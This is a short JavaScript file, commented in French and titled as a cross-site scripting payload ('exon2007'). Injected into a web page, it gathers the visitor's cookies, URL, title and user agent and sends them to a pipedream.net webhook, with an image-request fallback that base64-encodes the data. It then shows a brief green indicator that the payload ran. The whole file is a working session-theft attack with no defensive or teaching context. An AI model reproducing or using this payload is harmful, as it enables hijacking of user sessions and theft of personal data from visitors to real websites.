// =============================================
// XSS PAYLOAD - exon2007 (Version Corrigée)
// =============================================

// Évite la redéclaration avec var ou vérification
if (!window.XSS_LOADED) {
    window.XSS_LOADED = true;
    
    console.log('✅ XSS Payload chargé');

    // COLLECTE DE DONNÉES
    var data = {
        url: window.location.href,
        title: document.title,
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
    };

    // ENVOI VERS WEBHOOK
    fetch('https://eocjrr7wg4x5n7n.m.pipedream.net', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data),
        mode: 'no-cors'
    })
    .then(() => console.log('📨 Données envoyées'))
    .catch(error => {
        console.error('❌ Erreur fetch:', error);
        // Fallback
        new Image().src = 'https://eocjrr7wg4x5n7n.m.pipedream.net/?fallback=1&data=' + btoa(JSON.stringify(data));
    });

    // INDICATEUR VISUEL
    var indicator = document.createElement('div');
    indicator.style = 'position:fixed;bottom:10px;right:10px;width:10px;height:10px;background:#00ff00;border-radius:50%;z-index:9999;opacity:0.6;';
    document.body.appendChild(indicator);

    setTimeout(() => indicator.remove(), 5000);
}
